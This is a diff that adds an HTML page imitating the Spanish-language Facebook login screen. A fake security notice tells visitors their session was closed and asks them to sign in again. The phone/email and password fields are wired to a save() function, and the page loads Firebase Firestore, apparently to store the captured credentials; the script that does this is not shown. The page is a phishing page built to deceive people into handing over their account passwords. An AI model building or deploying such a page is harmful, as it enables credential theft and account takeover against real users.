@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Entrar o registrarse</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+</head>
+<body>
+    <!-- <div class="notice">
+        <div class="image">
+        </div>
+        <p class="">Descárgate Facebook para Android y navega más rápido</p>
+    </div> -->
+    <nav>
+        <img src="FB.svg" alt="">
+    </nav>
+    <div class="notice pe">
+        <div class="image">
+        </div>
+        <p class="pe">Ha habido un problema y cerramos la sesion por tu seguridad.<br/> Deberas iniciar sesion de nuevo.</p>
+    </div>
+    <div class="cont-text">
+       <input class="texto" type="text" placeholder="Número de móvil o correo electrónico" name="" id="user">
+       <input class="texto" type="password" placeholder="Contraseña" name="" id="passw">
+       <input href="#" onclick="save()" class="btn " id="btnEnviar" type="button" value="Entrar">
+       <a class="ha" href="">¿Has olvidado la contraseña?</a>
+       <input type="hidden" name="_next" value="http://127.0.0.1:5500/">
+       <input type="hidden" name="_captcha" value="false">
+    </div>
+    <img src="Captura.PNG" alt="">
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+
+    <script src="main.js"></script>
+</body>
+</html>
